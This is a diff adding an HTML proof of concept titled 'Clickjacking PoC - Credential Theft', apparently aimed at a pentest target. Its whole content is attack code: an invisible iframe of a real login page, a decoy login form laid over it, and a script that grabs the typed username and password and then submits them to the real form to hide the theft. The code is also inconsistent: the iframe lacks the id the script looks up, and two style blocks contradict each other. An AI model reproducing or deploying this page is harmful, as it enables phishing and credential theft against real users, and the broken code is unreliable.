@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+    <title>Clickjacking PoC - Credential Theft</title>
+    <style>
+      body 
+        /* The invisible iframe containing the real login page */
+        #vulnerable-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%; /* Make it fill the page */
+            height: 100%;
+            border: none;
+            z-index: 1; /* Underneath the fake form */
+            opacity: 0.0; /* Completely invisible */
+        }
+        
+        /* The container for our fake form */
+        #decoy-form-container {
+            position: absolute;
+            top: 175px;  /* IMPORTANT: Adjust to align with the real form */
+            left: 170px; /* IMPORTANT: Adjust to align with the real form */
+            z-index: 2; /* On top of the iframe */
+            background-color: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            font-family: sans-serif;
+        }
+
+        /* Basic styling to make the fake form look plausible */
+        #decoy-form-container input {
+            display: block;
+            margin-bottom: 10px;
+            padding: 8px;
+            width: 200px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. The invisible iframe loading the real login page -->
+    <iframe sandbox="allow-forms" src="https://hackzone.sumasoft-pentest.com/user/index.php"></iframe>
+    <style>
+    iframe {
+        position:relative;
+        width:1000px;
+        height:700px;
+        opacity:0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:100px;
+        left:100px;
+        z-index: 1;
+    }
+    </style>
+
+    <!-- 2. The fake login form the user sees and interacts with -->
+    <div id="decoy-form-container">
+        <h3>Login to Your Account</h3>
+        <form id="decoy-form">
+            <label for="username">Username:</label>
+            <input type="text" id="decoy-username" name="username" required>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="decoy-password" name="password" required>
+            
+            <input type="submit" value="Login">
+        </form>
+    </div>
+
+    <script>
+        // 3. The credential stealing and form submission logic
+        document.getElementById('decoy-form').addEventListener('submit', function(e) {
+            // Prevent the fake form from actually submitting and reloading the page
+            e.preventDefault();
+
+            // Grab the credentials from the fake form
+            var username = document.getElementById('decoy-username').value;
+            var password = document.getElementById('decoy-password').value;
+
+            // --- ATTACKER'S ACTION: STEAL CREDENTIALS ---
+            // In a real attack, this would send the credentials to the attacker's server.
+            // For our PoC, we will just display an alert to prove we have them.
+            alert("Credentials stolen!\nUsername: " + username + "\nPassword: " + password);
+            
+            // --- VICTIM'S DECEPTION: SUBMIT THE REAL FORM ---
+            // Access the content of the iframe
+            var iframe = document.getElementById('vulnerable-iframe');
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+
+            // Find the real username and password fields inside the iframe
+            // NOTE: You may need to inspect the real login page to find the correct IDs or names
+            var realUsernameInput = iframeDoc.querySelector('input[name="username"]'); 
+            var realPasswordInput = iframeDoc.querySelector('input[name="password"]');
+            var realForm = iframeDoc.querySelector('form');
+
+            if (realUsernameInput && realPasswordInput && realForm) {
+                // Set the values in the real form
+                realUsernameInput.value = username;
+                realPasswordInput.value = password;
+                
+                // Submit the real form
+                realForm.submit();
+            } else {
+                alert("Could not find the real form elements inside the iframe.");
+            }
+        });
+    </script>
+
+</body>
+</html>
